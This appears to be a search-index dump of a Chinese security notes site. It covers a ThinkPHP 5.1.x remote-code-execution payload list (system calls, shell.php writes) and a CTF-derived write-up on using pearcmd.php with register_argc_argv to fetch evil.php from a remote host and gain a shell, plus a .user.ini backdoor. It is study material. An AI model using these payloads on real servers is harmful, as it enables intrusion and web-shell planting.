<?php phpinfo (); ?> #\u6ce8\u610f\u7531\u4e8ewindows\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u539f\u56e0\u6240\u4ee5\u8fd9\u4e2apayload\u5728windows\u4e0b\u65e0\u6cd5\u4f7f\u7528 ?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content= <?php phpinfo (); ?> ?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id \u5206\u6790 #","title":"thinkphp 5.1.x RCE"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#thinkphp-51x-rce","text":"","title":"thinkphp 5.1.x RCE"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u53c2\u8003\u6587\u7ae0","text":"https://xz.aliyun.com/t/9369","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#rce1","text":"","title":"RCE1"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u6839\u672c\u539f\u56e0","text":"thinkphp\u6ca1\u6709\u5bf9\u7528\u6237\u4f20\u5165\u7684\u64cd\u4f5c\u5668\u540d\u79f0\u8fdb\u884c\u8fc7\u6ee4,\u5bfc\u81f4\u53ef\u4ee5\u8c03\u7528\u9876\u90e8\u7c7b\u4e2d\u7684\u65b9\u6cd5,\u9020\u6210\u4e00\u7cfb\u5217\u7684\u5371\u5bb3","title":"\u6839\u672c\u539f\u56e0"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u5f71\u54cd\u7248\u672c","text":"TP5.1.0-5.1.30","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#payload","text":"?s=index/\\think\\Request/input&filter[]=system&data=pwd ?s=index/\\think\\view\\driver\\Php/display&content= <?php phpinfo (); ?> #\u6ce8\u610f\u7531\u4e8ewindows\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u539f\u56e0\u6240\u4ee5\u8fd9\u4e2apayload\u5728windows\u4e0b\u65e0\u6cd5\u4f7f\u7528 ?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content= <?php phpinfo (); ?> ?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id","title":"payload"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u5206\u6790","text":"","title":"\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/","text":"register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 # \u5f15\u5b50\u662f\u5dc5\u5cf0\u6781\u5ba22020\u7684 Meow World ,\u9898\u76ee\u603b\u7ed3\u4e0b\u6765\u53ea\u6709\u4e00\u53e5\u8bdd: <?php include $_GET [ 'f' ] . \".php\" ; \u771f\u7684\u662f\u5f00\u5c40\u4e00\u4e2ainclude,getshell\u5168\u9760\u731c,\u6bd4\u8d5b\u65f6\u63d0\u793aregister argc argv,\u4f46\u6ca1\u505a\u51fa\u6765,\u8d5b\u540e\u770b\u4e86\u522b\u4eba\u7684wp\u548c\u603b\u7ed3,\u81ea\u5df1\u4e5f\u6253\u7b97\u5199\u4e00\u4e2a\u5c0f\u7ed3. register argc argv # \u9996\u5148\u4e86\u89e3\u5230\u8fd9\u4e2a\u53c2\u6570\u9ed8\u8ba4\u662fOn\u7684: \u4f46\u662f\u7ecf\u8fc7\u540e\u6765\u6d4b\u8bd5\u53d1\u73b0\u4f46\u51e1\u914d\u7f6e\u4e86php.ini\u7684php\u91cc\u90fd\u4f1a\u663e\u793a\u58f0\u660e\u8be5\u53c2\u6570\u4e3aOff,\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462? \u8fd9\u91cc\u4ecb\u7ecd\u4e86register argc argv\u7684\u4f5c\u7528,\u5f53\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u7684\u65f6\u5019,php\u4f1a\u6ce8\u518cargc\u548cargv\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf,\u5e76\u4e14\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u56fe\u53ef\u77e5\u6211\u4eec\u53ef\u4ee5\u4ece$_SERVER['argv'] \u4e2d\u83b7\u53d6\u5230\u8fd9\u4e9b\u503c. \u8fd9\u91cc\u5c31\u8981\u77e5\u9053php\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00,\u5f53\u7136\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c,\u800c\u6211\u4eec\u53ef\u4ee5\u5728\u811a\u672c\u4e2d\u76f4\u63a5\u8bbf\u95ee argv , argv , argc \u8fd9\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf. \u8fd9\u91cc\u5b9e\u9645\u6d4b\u8bd5\u4e0b\u8f7dregister argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b _SERVER['argv']\u4e0e _SERVER['argv']\u4e0e argv\u7684\u503c: <?php var_dump ( $_SERVER [ 'argv' ]); var_Dump ( $argv ); \u7f51\u9875\u7aef\u4e2d: \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b: \u800c\u5728register argc argv\u5173\u95ed\u7684\u60c5\u51b5\u4e0b,$_SERVER['argv']\u4e0d\u4f1a\u62ff\u5230\u4efb\u4f55\u53d6\u503c pear # \u63a5\u4e0b\u6765\u5c31\u8981\u4ecb\u7ecdpear\u8fd9\u4e2a\u547d\u4ee4,\u7b80\u4ecb\u5982\u4e0b: pear # Pear \u662f PHP \u6269\u5c55\u4e0e\u5e94\u7528\u5e93\uff08the PHP Extension and Application Repository\uff09\u7684\u7f29\u5199\uff0c\u662f\u4e00\u4e2a PHP \u6269\u5c55\u53ca\u5e94\u7528\u7684\u4e00\u4e2a\u4ee3\u7801\u4ed3\u5e93\u3002Pear \u4ed3\u5e93\u4ee3\u7801\u662f\u4ee5\u5305\uff08package\uff09\u5206\u533a\uff0c\u6bcf\u4e00\u4e2a Pear package \u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u9879\u76ee\u6709\u7740\u81ea\u5df1\u72ec\u7acb\u7684\u5f00\u53d1\u56e2\u961f\u3001\u7248\u672c\u63a7\u5236\u3001\u6587\u6863\u548c\u5176\u4ed6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u3002Pear package \u4ee5 phar\u3001tar \u6216 zip \u53d1\u5e03\u3002 \u65e2\u7136\u662f\u4e2a\u5305\u7ba1\u7406\u5668,\u90a3\u4e48\u5c31\u5e94\u8be5\u5b58\u5728\u4e0b\u8f7d\u548c\u5b89\u88c5\u5305\u7684\u529f\u80fd,\u90a3\u4e48pear\u547d\u4ee4\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462? \u5b9e\u9645\u4e0apear\u547d\u4ee4\u662fsh\u811a\u672c,\u6e90\u7801\u5982\u4e0b: #!/bin/sh # first find which PHP binary to use if test \"x $PHP_PEAR_PHP_BIN \" ! = \"x\" ; then PHP = \" $PHP_PEAR_PHP_BIN \" else if test \"/usr/local/bin/php\" = '@' php_bin '@' ; then PHP = php else PHP = \"/usr/local/bin/php\" fi fi # then look for the right pear include dir if test \"x $PHP_PEAR_INSTALL_DIR \" ! = \"x\" ; then INCDIR = $PHP_PEAR_INSTALL_DIR INCARG = \"-d include_path= $PHP_PEAR_INSTALL_DIR \" else if test \"/usr/local/lib/php\" = '@' php_dir '@' ; then INCDIR = ` dirname $0 ` INCARG = \"\" else INCDIR = \"/usr/local/lib/php\" INCARG = \"-d include_path=/usr/local/lib/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone = UTC -d output_buffering = 1 -d variables_order = EGPCS -d open_basedir = \"\" -d safe_mode = 0 -d register_argc_argv = \"On\" -d auto_prepend_file = \"\" -d auto_append_file = \"\" $INCDIR /pearcmd.php \" $@ \" \u901a\u8fc7\u770b\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u77e5\u9053\u5176\u5b9e\u5b83\u662f\u901a\u8fc7php\u8c03\u7528\u4e86pearcmd.php,\u90a3\u4e48pearcmd.php\u4e2d$argv\u662f\u4ece\u54ea\u91cc\u6765\u7684\u5462,\u901a\u8fc7\u7b80\u5355\u67e5\u627e\u53ef\u4ee5\u770b\u5230\u5176\u8c03\u7528\u4e86\u53e6\u4e00\u4e2aphp\u6587\u4ef6\u4e2d\u67d0\u4e2a\u7c7b\u65b9\u6cd5: require_once 'Console/Getopt.php'; /* ... */ $argv = Console_Getopt::readPHPArgv(); \u518d\u6b21\u8ddf\u8fdbConsole/Getopt.php,\u627e\u5230\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } \u53ef\u4ee5\u770b\u5230\u83b7\u53d6$argv\u7684\u65b9\u5f0f\u662f global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv'] \u540c\u65f6\u6211\u4eec\u77e5\u9053\u5f53\u6211\u4eecinclude\u4e00\u4e2a\u53ef\u4ee5\u88abphp\u89e3\u6790\u7684\u6587\u4ef6\u7684\u65f6\u5019,php\u4ee3\u7801\u4f1a\u88ab\u81ea\u52a8\u6267\u884c,\u8fd9\u6837\u5728register argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u5305\u542bpearcmd.php\u4e0e\u64cd\u63a7$_SERVER['argv']\u6765\u6267\u884cpear\u547d\u4ee4 pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d # \u6211\u4eec\u5148\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7pear\u547d\u4ee4\u6765\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d: \u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atmp.php \u4f7f\u7528python\u4e00\u53e5\u8bdd\u5f00\u542fhttp\u670d\u52a1\u5668: python -m SimpleHTTPServer 8080 \u901a\u8fc7\u6267\u884c pear \u547d\u4ee4\u83b7\u53d6\u5e2e\u52a9,\u53d1\u73b0\u5b58\u5728download\u9009\u9879,\u5c1d\u8bd5\u6267\u884c pear download http://127.0.0.1:8080/tmp.php ,\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6210\u529f\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8f7d\u4e86tmp.php: \u6709\u6ca1\u6709\u529e\u6cd5\u63a7\u5236\u4e0b\u8f7d\u76ee\u5f55?\u7b54\u6848\u662f\u4f7f\u7528install -R\u800c\u975edownload,\u5c1d\u8bd5\u6267\u884c pear install -R /var/www/html http://127.0.0.1:8080/tmp.php \u6210\u529f\u4e0b\u8f7d\u5230web\u76ee\u5f55\u4e0b\u5e76\u80fd\u591f\u8bbf\u95ee \u5982\u4f55\u63a7\u5236$_SERVER['argv'] # \u5982\u4f55\u5f80$_SERVER['argv']\u4f20\u51652\u4e2a\u6216\u4ee5\u4e0a\u7684\u53c2\u6570?\u6d4b\u8bd5\u4e00\u4e0b: \u5e76\u4e0d\u80fd\u901a\u8fc7&\u4f5c\u4e3a$_SERVER['argv']\u7684\u5206\u5272,\u901a\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u9605\u8bfb\u6e90\u7801: main/php_variables.c PHPAPI void php_build_argv ( const char * s , zval * track_vars_array ) { zval arr , argc , tmp ; int count = 0 ; if ( ! ( SG ( request_info ). argc || track_vars_array )) { return ; } array_init ( & arr ); /* Prepare argv */ if ( SG ( request_info ). argc ) { /* are we in cli sapi? */ int i ; for ( i = 0 ; i < SG ( request_info ). argc ; i ++ ) { ZVAL_STRING ( & tmp , SG ( request_info ). argv [ i ]); if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } } } else if ( s && * s ) { while ( 1 ) { const char * space = strchr ( s , '+' ); /* auto-type */ ZVAL_STRINGL ( & tmp , s , space ? space - s : strlen ( s )); count ++ ; if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } if ( ! space ) { break ; } s = space + 1 ; } } \u53ef\u4ee5\u77e5\u9053argv\u901a\u8fc7query_string\u53d6\u503c,\u5e76\u901a\u8fc7+\u4f5c\u4e3a\u5206\u5272\u7b26,\u5c1d\u8bd5\u4e00\u4e0b: \u56de\u5230\u9898\u76ee # \u73b0\u5728\u56de\u5230\u9898\u76ee,\u6211\u4eec\u6240\u6709\u7684\u62fc\u56fe\u5df2\u7ecf\u51d1\u9f50\u4e86,\u5047\u5982\u5b58\u5728\u4ee5\u4e0b\u73af\u5883: \u5b89\u88c5\u4e86pear \u5f00\u542f\u4e86register argc argv \u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662f include $_GET['f'].php ) \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u77e5\u8bc6\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4ece\u800cgetshell: // web\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil \u540e\u95e8 # \u524d\u9762\u63d0\u5230register argc argv\u662fPHP INI PERDIR\u7684,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b0\u5efa\u4e00\u4e2a.user.ini\u8bbe\u7f6eregister argc argv\u4e3aOn\u7528\u4e8e\u7559\u540e\u95e8 \u6700\u540e:docker # \u5728php\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf\u4e0b,\u9ed8\u8ba4\u662f\u4e0d\u4f7f\u7528php.ini\u7684(\u5728/usr/local/etc/php\u4e2d\u5b58\u5728php.ini-production\u548cphp.ini-development,\u9700\u8981\u624b\u52a8\u4fee\u6539\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3aphp.ini\u624d\u4f1a\u542f\u52a8php.ini,\u800c\u4e0a\u9762\u6211\u4eec\u63d0\u5230\u5728php.ini\u4e2dregister argc argv\u90fd\u8bbe\u7f6e\u4e3aOff) \u800cregister argc argv\u5728\u4e0d\u8bbe\u7f6e\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u4e3aOn,\u90a3\u4e48\u5047\u5982\u6709\u4e00\u4e2a\u9ed8\u8ba4\u7684docker-php\u73af\u5883,\u5e76\u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662finclude $_GET['f'].php),\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0getshell","title":"register_argc_argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#registerargcargv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3","text":"\u5f15\u5b50\u662f\u5dc5\u5cf0\u6781\u5ba22020\u7684 Meow World ,\u9898\u76ee\u603b\u7ed3\u4e0b\u6765\u53ea\u6709\u4e00\u53e5\u8bdd: <?php include $_GET [ 'f' ] . \".php\" ; \u771f\u7684\u662f\u5f00\u5c40\u4e00\u4e2ainclude,getshell\u5168\u9760\u731c,\u6bd4\u8d5b\u65f6\u63d0\u793aregister argc argv,\u4f46\u6ca1\u505a\u51fa\u6765,\u8d5b\u540e\u770b\u4e86\u522b\u4eba\u7684wp\u548c\u603b\u7ed3,\u81ea\u5df1\u4e5f\u6253\u7b97\u5199\u4e00\u4e2a\u5c0f\u7ed3.","title":"registerargcargv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#registerargcargv","text":"\u9996\u5148\u4e86\u89e3\u5230\u8fd9\u4e2a\u53c2\u6570\u9ed8\u8ba4\u662fOn\u7684: \u4f46\u662f\u7ecf\u8fc7\u540e\u6765\u6d4b\u8bd5\u53d1\u73b0\u4f46\u51e1\u914d\u7f6e\u4e86php.ini\u7684php\u91cc\u90fd\u4f1a\u663e\u793a\u58f0\u660e\u8be5\u53c2\u6570\u4e3aOff,\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462? \u8fd9\u91cc\u4ecb\u7ecd\u4e86register argc argv\u7684\u4f5c\u7528,\u5f53\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u7684\u65f6\u5019,php\u4f1a\u6ce8\u518cargc\u548cargv\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf,\u5e76\u4e14\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u56fe\u53ef\u77e5\u6211\u4eec\u53ef\u4ee5\u4ece$_SERVER['argv'] \u4e2d\u83b7\u53d6\u5230\u8fd9\u4e9b\u503c. \u8fd9\u91cc\u5c31\u8981\u77e5\u9053php\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00,\u5f53\u7136\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c,\u800c\u6211\u4eec\u53ef\u4ee5\u5728\u811a\u672c\u4e2d\u76f4\u63a5\u8bbf\u95ee argv , argv , argc \u8fd9\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf. \u8fd9\u91cc\u5b9e\u9645\u6d4b\u8bd5\u4e0b\u8f7dregister argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b _SERVER['argv']\u4e0e _SERVER['argv']\u4e0e argv\u7684\u503c: <?php var_dump ( $_SERVER [ 'argv' ]); var_Dump ( $argv ); \u7f51\u9875\u7aef\u4e2d: \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b: \u800c\u5728register argc argv\u5173\u95ed\u7684\u60c5\u51b5\u4e0b,$_SERVER['argv']\u4e0d\u4f1a\u62ff\u5230\u4efb\u4f55\u53d6\u503c","title":"registerargcargv"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#pear","text":"\u63a5\u4e0b\u6765\u5c31\u8981\u4ecb\u7ecdpear\u8fd9\u4e2a\u547d\u4ee4,\u7b80\u4ecb\u5982\u4e0b:","title":"pear"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#pear_1","text":"Pear \u662f PHP \u6269\u5c55\u4e0e\u5e94\u7528\u5e93\uff08the PHP Extension and Application Repository\uff09\u7684\u7f29\u5199\uff0c\u662f\u4e00\u4e2a PHP \u6269\u5c55\u53ca\u5e94\u7528\u7684\u4e00\u4e2a\u4ee3\u7801\u4ed3\u5e93\u3002Pear \u4ed3\u5e93\u4ee3\u7801\u662f\u4ee5\u5305\uff08package\uff09\u5206\u533a\uff0c\u6bcf\u4e00\u4e2a Pear package \u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u9879\u76ee\u6709\u7740\u81ea\u5df1\u72ec\u7acb\u7684\u5f00\u53d1\u56e2\u961f\u3001\u7248\u672c\u63a7\u5236\u3001\u6587\u6863\u548c\u5176\u4ed6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u3002Pear package \u4ee5 phar\u3001tar \u6216 zip \u53d1\u5e03\u3002 \u65e2\u7136\u662f\u4e2a\u5305\u7ba1\u7406\u5668,\u90a3\u4e48\u5c31\u5e94\u8be5\u5b58\u5728\u4e0b\u8f7d\u548c\u5b89\u88c5\u5305\u7684\u529f\u80fd,\u90a3\u4e48pear\u547d\u4ee4\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462? \u5b9e\u9645\u4e0apear\u547d\u4ee4\u662fsh\u811a\u672c,\u6e90\u7801\u5982\u4e0b: #!/bin/sh # first find which PHP binary to use if test \"x $PHP_PEAR_PHP_BIN \" ! = \"x\" ; then PHP = \" $PHP_PEAR_PHP_BIN \" else if test \"/usr/local/bin/php\" = '@' php_bin '@' ; then PHP = php else PHP = \"/usr/local/bin/php\" fi fi # then look for the right pear include dir if test \"x $PHP_PEAR_INSTALL_DIR \" ! = \"x\" ; then INCDIR = $PHP_PEAR_INSTALL_DIR INCARG = \"-d include_path= $PHP_PEAR_INSTALL_DIR \" else if test \"/usr/local/lib/php\" = '@' php_dir '@' ; then INCDIR = ` dirname $0 ` INCARG = \"\" else INCDIR = \"/usr/local/lib/php\" INCARG = \"-d include_path=/usr/local/lib/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone = UTC -d output_buffering = 1 -d variables_order = EGPCS -d open_basedir = \"\" -d safe_mode = 0 -d register_argc_argv = \"On\" -d auto_prepend_file = \"\" -d auto_append_file = \"\" $INCDIR /pearcmd.php \" $@ \" \u901a\u8fc7\u770b\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u77e5\u9053\u5176\u5b9e\u5b83\u662f\u901a\u8fc7php\u8c03\u7528\u4e86pearcmd.php,\u90a3\u4e48pearcmd.php\u4e2d$argv\u662f\u4ece\u54ea\u91cc\u6765\u7684\u5462,\u901a\u8fc7\u7b80\u5355\u67e5\u627e\u53ef\u4ee5\u770b\u5230\u5176\u8c03\u7528\u4e86\u53e6\u4e00\u4e2aphp\u6587\u4ef6\u4e2d\u67d0\u4e2a\u7c7b\u65b9\u6cd5: require_once 'Console/Getopt.php'; /* ... */ $argv = Console_Getopt::readPHPArgv(); \u518d\u6b21\u8ddf\u8fdbConsole/Getopt.php,\u627e\u5230\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } \u53ef\u4ee5\u770b\u5230\u83b7\u53d6$argv\u7684\u65b9\u5f0f\u662f global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv'] \u540c\u65f6\u6211\u4eec\u77e5\u9053\u5f53\u6211\u4eecinclude\u4e00\u4e2a\u53ef\u4ee5\u88abphp\u89e3\u6790\u7684\u6587\u4ef6\u7684\u65f6\u5019,php\u4ee3\u7801\u4f1a\u88ab\u81ea\u52a8\u6267\u884c,\u8fd9\u6837\u5728register argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u5305\u542bpearcmd.php\u4e0e\u64cd\u63a7$_SERVER['argv']\u6765\u6267\u884cpear\u547d\u4ee4","title":"pear"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"\u6211\u4eec\u5148\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7pear\u547d\u4ee4\u6765\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d: \u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atmp.php \u4f7f\u7528python\u4e00\u53e5\u8bdd\u5f00\u542fhttp\u670d\u52a1\u5668: python -m SimpleHTTPServer 8080 \u901a\u8fc7\u6267\u884c pear \u547d\u4ee4\u83b7\u53d6\u5e2e\u52a9,\u53d1\u73b0\u5b58\u5728download\u9009\u9879,\u5c1d\u8bd5\u6267\u884c pear download http://127.0.0.1:8080/tmp.php ,\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6210\u529f\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8f7d\u4e86tmp.php: \u6709\u6ca1\u6709\u529e\u6cd5\u63a7\u5236\u4e0b\u8f7d\u76ee\u5f55?\u7b54\u6848\u662f\u4f7f\u7528install -R\u800c\u975edownload,\u5c1d\u8bd5\u6267\u884c pear install -R /var/www/html http://127.0.0.1:8080/tmp.php \u6210\u529f\u4e0b\u8f7d\u5230web\u76ee\u5f55\u4e0b\u5e76\u80fd\u591f\u8bbf\u95ee","title":"pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u5982\u4f55\u63a7\u5236_serverargv","text":"\u5982\u4f55\u5f80$_SERVER['argv']\u4f20\u51652\u4e2a\u6216\u4ee5\u4e0a\u7684\u53c2\u6570?\u6d4b\u8bd5\u4e00\u4e0b: \u5e76\u4e0d\u80fd\u901a\u8fc7&\u4f5c\u4e3a$_SERVER['argv']\u7684\u5206\u5272,\u901a\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u9605\u8bfb\u6e90\u7801: main/php_variables.c PHPAPI void php_build_argv ( const char * s , zval * track_vars_array ) { zval arr , argc , tmp ; int count = 0 ; if ( ! ( SG ( request_info ). argc || track_vars_array )) { return ; } array_init ( & arr ); /* Prepare argv */ if ( SG ( request_info ). argc ) { /* are we in cli sapi? */ int i ; for ( i = 0 ; i < SG ( request_info ). argc ; i ++ ) { ZVAL_STRING ( & tmp , SG ( request_info ). argv [ i ]); if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } } } else if ( s && * s ) { while ( 1 ) { const char * space = strchr ( s , '+' ); /* auto-type */ ZVAL_STRINGL ( & tmp , s , space ? space - s : strlen ( s )); count ++ ; if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } if ( ! space ) { break ; } s = space + 1 ; } } 